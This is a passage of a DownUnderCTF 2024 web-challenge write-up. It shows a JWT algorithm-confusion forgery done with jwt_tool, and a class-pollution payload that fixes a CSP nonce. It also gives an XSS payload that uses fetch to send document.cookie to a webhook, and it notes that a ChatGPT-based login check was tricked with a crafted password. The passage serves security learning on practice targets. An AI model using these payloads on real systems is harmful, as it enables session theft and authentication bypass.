</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-22.png" alt="alt text" data-proofer-ignore></p><p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{koo-koo-koo-koo-koo-ka-ka-ka-ka-kaw-kaw-kaw!!}</code></p><h2 id="web--i-am-confusion"><span class="mr-2">Web : i am confusion</span><a href="#web--i-am-confusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-5.png" alt="alt text" data-proofer-ignore></p><p>It’s possible to login as any username and password but browsing the admin page will redirect the user to unintended page.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-23.png" alt="alt text" data-proofer-ignore></p><p>Again, source code review! Below are the code for accessing admin page.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">verifyAlg</span> <span class="o">=</span> <span class="p">{</span> <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">RS256</span><span class="dl">'</span><span class="p">]</span> <span class="p">}</span>
<span class="kd">const</span> <span class="nx">signAlg</span> <span class="o">=</span> <span class="p">{</span> <span class="na">algorithm</span><span class="p">:</span><span class="dl">'</span><span class="s1">RS256</span><span class="dl">'</span> <span class="p">}</span>

<span class="nx">app</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/admin.html</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">cookie</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">cookies</span><span class="p">;</span>
  <span class="c1">// Verify the JWT </span>
  <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">cookie</span><span class="p">[</span><span class="dl">'</span><span class="s1">auth</span><span class="dl">'</span><span class="p">],</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="nx">verifyAlg</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">decoded_jwt</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">403 -.-</span><span class="dl">"</span><span class="p">);</span>
    <span class="c1">// If user key == admin -&gt; get the flag!</span>
    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">decoded_jwt</span><span class="p">[</span><span class="dl">'</span><span class="s1">user</span><span class="dl">'</span><span class="p">]</span> <span class="o">==</span> <span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">'</span><span class="s1">admin.html</span><span class="dl">'</span><span class="p">))</span> <span class="c1">// flag!</span>
    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
      <span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mi">403</span><span class="p">).</span><span class="nx">sendFile</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="dl">'</span><span class="s1">/public/hehe.html</span><span class="dl">'</span><span class="p">))</span>
    <span class="p">}</span>
  <span class="p">})</span>
<span class="p">})</span>
</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">signAlg</code> was used in the login function.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">jwt_token</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">payload</span><span class="p">,</span> <span class="nx">privateKey</span><span class="p">,</span> <span class="nx">signAlg</span><span class="p">)</span>
</pre></table></code></div></div><p>I’m not an expert with JWT, but it seems suspicious that two algorithms are used to verify the JWT. While searching, I found <a href="https://github.com/advisories/GHSA-4xw9-cx39-r355">this</a> GitHub Advisory mentioning that the <code class="language-plaintext highlighter-rouge">json-web-token</code> library versions <code class="language-plaintext highlighter-rouge">&lt;= 3.1.1</code> are vulnerable to a <strong>JWT algorithm confusion attack</strong>. Inside the <code class="language-plaintext highlighter-rouge">package.json</code> challenge file, it stated that the version of <code class="language-plaintext highlighter-rouge">jsonwebtoken</code> was <code class="language-plaintext highlighter-rouge">^4.0.0</code>. But looking in <a href="https://security.snyk.io/vuln/SNYK-JS-JSONWEBTOKEN-6069816">here</a> it was mentioned that <code class="language-plaintext highlighter-rouge">There is no fixed version</code> ? Let’s just try the exploit!</p><p><strong>Public key recovery</strong></p><p>First, retrieve two (2) different JWT tokens and utilize <a href="https://github.com/silentsignal/rsa_sign2n/blob/release/standalone/jwt_forgery.py">jwt_forgery.py</a> to generate a few public keys.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">python3</span> <span class="n">jwt_forgery</span><span class="p">.</span><span class="n">py</span> <span class="s">"&lt;JWT_TOKEN_1&gt;"</span> <span class="s">"&lt;JWT_TOKEN_2&gt;"</span>
</pre></table></code></div></div><p><strong>Algorithm confusion</strong></p><p>Use each of the generated <code class="language-plaintext highlighter-rouge">.pem</code> files and change the JWT to the <strong>HS256 algorithm</strong>. Ensure to change the <code class="language-plaintext highlighter-rouge">user</code> to an admin.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="n">python3</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="s">"&lt;token&gt;"</span> <span class="p">-</span><span class="n">I</span> <span class="p">-</span><span class="n">pc</span> <span class="n">user</span> <span class="p">-</span><span class="n">pv</span> <span class="n">admin</span> <span class="p">-</span><span class="n">X</span> <span class="n">k</span> <span class="p">-</span><span class="n">pk</span> <span class="n">publickey</span><span class="p">.</span><span class="n">pem</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-24.png" alt="alt text" data-proofer-ignore></p><p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{c0nfus!ng_0nE_bUG_@t_a_tIme}</code></p><h2 id="web--co2v2"><span class="mr-2">Web : co2v2</span><a href="#web--co2v2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-6.png" alt="alt text" data-proofer-ignore></p><p>This challenge is an improvement of <code class="language-plaintext highlighter-rouge">co2</code>. Most of the endpoints look the same but following are the relevant new added lines of codes.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre><td class="rouge-code"><pre><span class="c1"># Secret used to generate a nonce to be used with the CSP policy 
</span><span class="n">SECRET_NONCE</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">()</span>
<span class="c1"># Use a random amount of characters to append while generating nonce value to make it more secure
</span><span class="n">RANDOM_COUNT</span> <span class="o">=</span> <span class="n">random</span><span class="p">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span><span class="mi">64</span><span class="p">)</span>

<span class="n">TEMPLATES_ESCAPE_ALL</span> <span class="o">=</span> <span class="bp">True</span>
<span class="n">TEMPLATES_ESCAPE_NONE</span> <span class="o">=</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">generate_nonce</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="n">nonce</span> <span class="o">=</span> <span class="n">SECRET_NONCE</span> <span class="o">+</span> <span class="n">data</span> <span class="o">+</span> <span class="n">generate_random_string</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="n">RANDOM_COUNT</span><span class="p">)</span>
    <span class="n">sha256_hash</span> <span class="o">=</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha256</span><span class="p">()</span>
    <span class="n">sha256_hash</span><span class="p">.</span><span class="n">update</span><span class="p">(</span><span class="n">nonce</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'utf-8'</span><span class="p">))</span>
    <span class="n">hash_hex</span> <span class="o">=</span> <span class="n">sha256_hash</span><span class="p">.</span><span class="n">hexdigest</span><span class="p">()</span>
    <span class="n">g</span><span class="p">.</span><span class="n">nonce</span> <span class="o">=</span> <span class="n">hash_hex</span>
    <span class="k">return</span> <span class="n">hash_hex</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">before_request</span>
<span class="k">def</span> <span class="nf">set_nonce</span><span class="p">():</span>
    <span class="n">generate_nonce</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">path</span><span class="p">)</span>

<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">after_request</span>
<span class="k">def</span> <span class="nf">apply_csp</span><span class="p">(</span><span class="n">response</span><span class="p">):</span>
    <span class="n">nonce</span> <span class="o">=</span> <span class="n">g</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'nonce'</span><span class="p">)</span>
    <span class="n">csp_policy</span> <span class="o">=</span> <span class="p">(</span>
        <span class="sa">f</span><span class="s">"default-src 'self'; "</span>
        <span class="sa">f</span><span class="s">"script-src 'self' 'nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s">' https://ajax.googleapis.com; "</span>
        <span class="sa">f</span><span class="s">"style-src 'self' 'nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s">' https://cdn.jsdelivr.net; "</span>
        <span class="sa">f</span><span class="s">"script-src-attr 'self' 'nonce-</span><span class="si">{</span><span class="n">nonce</span><span class="si">}</span><span class="s">'; "</span> 
        <span class="sa">f</span><span class="s">"connect-src *; "</span>
    <span class="p">)</span>
    <span class="n">response</span><span class="p">.</span><span class="n">headers</span><span class="p">[</span><span class="s">'Content-Security-Policy'</span><span class="p">]</span> <span class="o">=</span> <span class="n">csp_policy</span>
    <span class="k">return</span> <span class="n">response</span>

<span class="c1"># Future Admin routes - FOR TEST ENVIRONMENT ONLY
</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/admin/update-accepted-templates"</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">"POST"</span><span class="p">])</span>
<span class="o">@</span><span class="n">login_required</span>
<span class="k">def</span> <span class="nf">update_template</span><span class="p">():</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">data</span><span class="p">)</span>
    <span class="c1"># Enforce strict policy to filter all expressions
</span>    <span class="k">if</span> <span class="s">"policy"</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">and</span> <span class="n">data</span><span class="p">[</span><span class="s">"policy"</span><span class="p">]</span> <span class="o">==</span> <span class="s">"strict"</span><span class="p">:</span>
        <span class="n">template_env</span><span class="p">.</span><span class="n">env</span> <span class="o">=</span> <span class="n">Environment</span><span class="p">(</span><span class="n">loader</span><span class="o">=</span><span class="n">PackageLoader</span><span class="p">(</span><span class="s">"app"</span><span class="p">,</span> <span class="s">"templates"</span><span class="p">),</span> <span class="n">autoescape</span><span class="o">=</span><span class="n">TEMPLATES_ESCAPE_ALL</span><span class="p">)</span>
    <span class="c1"># elif "policy" in data and data["policy"] == "lax":
</span>    <span class="c1">#     template_env.env = Environment(loader=PackageLoader("app", "templates"), autoescape=TEMPLATES_ESCAPE_NONE)
</span>    <span class="c1"># TO DO: Add more configurations for allowing LateX, XML etc. to be configured in app
</span>    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s">"success"</span><span class="p">:</span> <span class="s">"true"</span><span class="p">}),</span> <span class="mi">200</span>


<span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">"/api/v1/report"</span><span class="p">)</span>
<span class="o">@</span><span class="n">limiter</span><span class="p">.</span><span class="n">limit</span><span class="p">(</span><span class="s">"6 per minute"</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">report</span><span class="p">():</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">"XSSBOT_URL"</span><span class="p">,</span> <span class="s">"http</span><span class="si">:</span><span class="o">//</span><span class="n">xssbot</span><span class="si">:</span><span class="mi">8000</span><span class="s">")</span><span class="si">}</span><span class="s">/visit'</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s">'url'</span><span class="p">:</span>
        <span class="n">os</span><span class="p">.</span><span class="n">getenv</span><span class="p">(</span><span class="s">"APP_URL"</span><span class="p">,</span> <span class="s">"http://co2v2:1337"</span><span class="p">)</span>
    <span class="p">},</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span>
        <span class="s">'X-SSRF-Protection'</span><span class="p">:</span> <span class="s">'1'</span>
    <span class="p">})</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">(</span><span class="n">status</span><span class="o">=</span><span class="n">resp</span><span class="p">.</span><span class="n">status_code</span><span class="p">)</span>
</pre></table></code></div></div><p>The flag can be found in <code class="language-plaintext highlighter-rouge">src/cookiejar</code>, and since <code class="language-plaintext highlighter-rouge">httponly</code> was set to <code class="language-plaintext highlighter-rouge">true</code>, it’s possible to steal the cookies! This indicates that an <strong>XSS</strong> attack is involved.</p><div class="language-js highlighter-rouge"><div class="code-header"> <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="p">[</span>
  <span class="p">{</span>
    <span class="dl">"</span><span class="s2">domain</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">co2v2:1337</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">name</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">admin-cookie</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">value</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">DUCTF{testflag}</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">httponly</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span>
  <span class="p">}</span>
<span class="p">]</span>
</pre></table></code></div></div><p>Any request will go through the <code class="language-plaintext highlighter-rouge">apply_csp()</code> function. However, the policy<code class="language-plaintext highlighter-rouge"> script-src-attr 'self' 'nonce-{nonce}';</code> might be bypassed if we can obtain a valid <code class="language-plaintext highlighter-rouge">nonce</code> value. Let’s first understand how the <code class="language-plaintext highlighter-rouge">nonce</code> is generated.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="err">#</span> <span class="n">Generatead</span>
<span class="n">nonce</span> <span class="p">=</span> <span class="n">SECRET_NONCE</span> <span class="p">+</span> <span class="n">data</span> <span class="p">+</span> <span class="nf">generate_random_string</span><span class="p">(</span><span class="n">length</span><span class="p">=</span><span class="n">RANDOM_COUNT</span><span class="p">)</span>

<span class="err">#</span> <span class="n">Notes</span>
<span class="m">1.</span> <span class="n">SECRET_NONCE</span> <span class="p">=</span> <span class="n">Possible</span> <span class="n">to</span> <span class="n">alter</span> <span class="k">using</span> <span class="nn">prototype</span> <span class="n">polllution</span>
<span class="m">2.</span> <span class="n">data</span> <span class="p">=</span> <span class="n">request</span><span class="p">.</span><span class="n">path</span>
<span class="m">3.</span> <span class="n">RANDOM_COUNT</span> <span class="p">=</span> <span class="n">Possible</span> <span class="n">to</span> <span class="n">alter</span> <span class="k">using</span> <span class="nn">prototype</span> <span class="n">pollution</span>
</pre></table></code></div></div><p>Also, we need to ensure the global variable <code class="language-plaintext highlighter-rouge">TEMPLATES_ESCAPE_ALL</code> has been set to <code class="language-plaintext highlighter-rouge">False</code> as it been used in the <code class="language-plaintext highlighter-rouge">jEnv()</code> function</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="bp">self</span><span class="p">.</span><span class="n">env</span> <span class="o">=</span> <span class="n">Environment</span><span class="p">(</span><span class="n">loader</span><span class="o">=</span><span class="n">PackageLoader</span><span class="p">(</span><span class="s">"app"</span><span class="p">,</span> <span class="s">"templates"</span><span class="p">),</span> <span class="n">autoescape</span><span class="o">=</span><span class="n">TEMPLATES_ESCAPE_ALL</span><span class="p">)</span>
</pre></table></code></div></div><p>With this in knowledge, the following payload can be use to get a valid nonce.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="p">{</span>
<span class="s">"__class__"</span><span class="p">:{</span>
    <span class="s">"__init__"</span><span class="p">:{</span>
        <span class="s">"__globals__"</span><span class="p">:{</span>
            <span class="s">"SECRET_NONCE"</span><span class="p">:</span><span class="s">"onlyusknow"</span><span class="p">,</span>
            <span class="s">"RANDOM_COUNT"</span><span class="p">:</span><span class="m">0</span><span class="p">,</span>
            <span class="s">"TEMPLATES_ESCAPE_ALL"</span><span class="p">:</span><span class="k">false</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>To check if everything is working properly, we could refresh the <code class="language-plaintext highlighter-rouge">/</code> endpoint a few times and notice that the <code class="language-plaintext highlighter-rouge">nonce</code> value does not change at all. Nice!</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-25.png" alt="alt text" data-proofer-ignore></p><p>Changing <code class="language-plaintext highlighter-rouge">TEMPLATES_ESCAPE_ALL</code> alone does not yet affect the environment. We need to hit <code class="language-plaintext highlighter-rouge">/admin/update-accepted-templates</code> with the following payload to properly update the environment.</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="s">"policy"</span><span class="p">:</span><span class="s">"strict"</span><span class="p">}</span>
</pre></table></code></div></div><p>Now, by adding a new blog with the HTML payload <code class="language-plaintext highlighter-rouge">&lt;h1&gt;a&lt;/h1&gt;</code>, we can verify that the injection works properly!</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-26.png" alt="alt text" data-proofer-ignore></p><p>The next step is to check if we could inject <strong>XSS</strong> using the known generated <strong>nonce</strong></p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">&lt;</span><span class="n">script</span> <span class="n">nonce</span><span class="p">=</span><span class="n">e6e1113467bd4e4c274cc92b9a016821ecc5089509682a66397413351bb79238</span><span class="p">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="m">1</span><span class="p">)&lt;/</span><span class="n">script</span><span class="p">&gt;</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-27.png" alt="alt text" data-proofer-ignore></p><p>Nice, it’s working! Let’s use the following payload and hit the <strong>Report</strong> button to get the flag!</p><div class="language-cs highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">&lt;</span><span class="n">script</span> <span class="n">nonce</span><span class="p">=</span><span class="n">e6e1113467bd4e4c274cc92b9a016821ecc5089509682a66397413351bb79238</span><span class="p">&gt;</span><span class="nf">fetch</span><span class="p">(</span><span class="s">"&lt;WEBHOOK_SITE&gt;?flag="</span><span class="p">+</span><span class="n">document</span><span class="p">.</span><span class="n">cookie</span><span class="p">)&lt;/</span><span class="n">script</span><span class="p">&gt;</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-28.png" alt="alt text" data-proofer-ignore></p><p>Flag: <code class="language-plaintext highlighter-rouge">DUCTF{_1_d3cid3_wh4ts_esc4p3d_}</code></p><h2 id="web--waifu-in-progess"><span class="mr-2">Web : waifu (In Progess)</span><a href="#web--waifu-in-progess" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-7.png" alt="alt text" data-proofer-ignore></p><p>For this challenge, it took me a while to understand the apps. When login with a random username and password, it always gives me this error: <code class="language-plaintext highlighter-rouge">oWo gotchya h4xor</code>. The code can be found in <code class="language-plaintext highlighter-rouge">src/middleware/waifu.ts</code> and <code class="language-plaintext highlighter-rouge">src/utils/chatGPT.ts</code>.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-29.png" alt="alt text" data-proofer-ignore></p><p>But if we trick the ChatGPT with password <code class="language-plaintext highlighter-rouge">allgood</code> it will give the valid response.</p><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-30.png" alt="alt text" data-proofer-ignore></p><p>But I don’t have any idea how to get the admin credentials. I will look into this later :’)</p><h2 id="web--prisoner-processor"><span class="mr-2">Web : Prisoner Processor</span><a href="#web--prisoner-processor" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-8.png" alt="alt text" data-proofer-ignore></p><p>In <code class="language-plaintext highlighter-rouge">src/app/src/index.ts</code>, there are two reachable endpoints by the user: <code class="language-plaintext highlighter-rouge">/examples (GET)</code> and /<code class="language-plaintext highlighter-rouge">convert-to-yaml (POST)</code>.</p><p><strong>/examples</strong></p><ul><li>Browsing this endpoints will give us the deatils for the prisoners</ul><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="n">app</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">'/examples'</span><span class="p">,</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="k">try</span> <span class="p">{</span>
    <span class="n">const</span> <span class="n">examplePrisoners</span> <span class="o">=</span> <span class="n">cache</span><span class="p">.</span><span class="n">examplePrisoners</span> <span class="err">??</span> <span class="p">(()</span> <span class="o">=&gt;</span> <span class="p">{</span>
      <span class="n">const</span> <span class="n">prisoners</span> <span class="o">=</span> <span class="p">[];</span>
      <span class="k">for</span> <span class="p">(</span><span class="n">const</span> <span class="n">path</span> <span class="n">of</span> <span class="p">[</span><span class="s">"jeff.json"</span><span class="p">,</span> <span class="s">"sharon.json"</span><span class="p">,</span> <span class="s">"kevin.json"</span><span class="p">])</span> <span class="p">{</span>
        <span class="n">const</span> <span class="n">fullPath</span> <span class="o">=</span> <span class="sb">`/app/examples/${path}`</span><span class="p">;</span>
        <span class="n">const</span> <span class="n">json</span> <span class="o">=</span> <span class="n">JSON</span><span class="p">.</span><span class="n">parse</span><span class="p">(</span><span class="n">readFileSync</span><span class="p">(</span><span class="n">fullPath</span><span class="p">).</span><span class="n">toString</span><span class="p">());</span>
        <span class="n">prisoners</span><span class="p">.</span><span class="n">push</span><span class="p">({</span>
          <span class="n">data</span><span class="p">:</span> <span class="n">json</span><span class="p">,</span>
          <span class="n">signature</span><span class="p">:</span> <span class="n">getSignature</span><span class="p">(</span><span class="n">getSignedData</span><span class="p">(</span><span class="n">json</span><span class="p">))</span>
        <span class="p">});</span>
      <span class="p">}</span>
      <span class="n">cache</span><span class="p">.</span><span class="n">examplePrisoners</span> <span class="o">=</span> <span class="n">prisoners</span><span class="p">;</span>
      <span class="k">return</span> <span class="n">prisoners</span><span class="p">;</span>
    <span class="p">})();</span>
    <span class="k">return</span> <span class="n">c</span><span class="p">.</span><span class="n">json</span><span class="p">({</span> <span class="n">examples</span><span class="p">:</span> <span class="n">examplePrisoners</span> <span class="p">});</span>
  <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">error</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">c</span><span class="p">.</span><span class="n">json</span><span class="p">({</span> <span class="n">msg</span><span class="p">:</span> <span class="s">"you really goofed something up lol"</span> <span class="p">})</span>
  <span class="p">}</span>
<span class="p">});</span>
</pre></table></code></div></div><p><img data-src="https://raw.githubusercontent.com/H0j3n/H0j3n.github.io/master/assets/img/uploads/15_downunderctf_2024/image-31.png" alt="alt text" data-proofer-ignore></p><p><strong>/convert-to-yaml</strong></p><ul><li>Will need to pass a valid json body with a correct signature.</ul><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="n">app</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">'/convert-to-yaml'</span><span class="p">,</span>
  <span class="n">bodyLimit</span><span class="p">({</span>
